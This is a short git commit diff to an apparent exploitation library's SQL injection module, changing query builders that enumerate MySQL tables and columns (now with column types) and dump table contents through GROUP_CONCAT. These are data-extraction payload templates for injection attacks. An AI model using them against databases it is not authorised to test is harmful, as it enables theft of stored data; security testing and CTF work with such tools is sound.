769ffc864598292b3a6bdd35c971ba23b1cf5888
Morten Brøns-Pedersen <mortenbp@gmail.com>
2012-11-28 15:49:47 +0100

    dump column type as well

--- pwn/sqli/requests.py
+++ pwn/sqli/requests.py
@@ -3,9 +3,9 @@
 mysql_tables = 'SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema <> "information_schema" AND table_schema <> "mysql"'
 
 def mysql_columns(table):
-    return 'SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = "%s"' % table
+    return 'SELECT GROUP_CONCAT(CONCAT(column_name,"(",column_type,")")) FROM information_schema.columns WHERE table_name = "%s"' % table
 
-def mysql_dump(table, columns, rows = -1):
+def mysql_dump(table, columns):
     return 'SELECT GROUP_CONCAT(CONCAT_WS("|",%s) SEPARATOR "\\n") from %s' % \
         (','.join(columns), table)
 
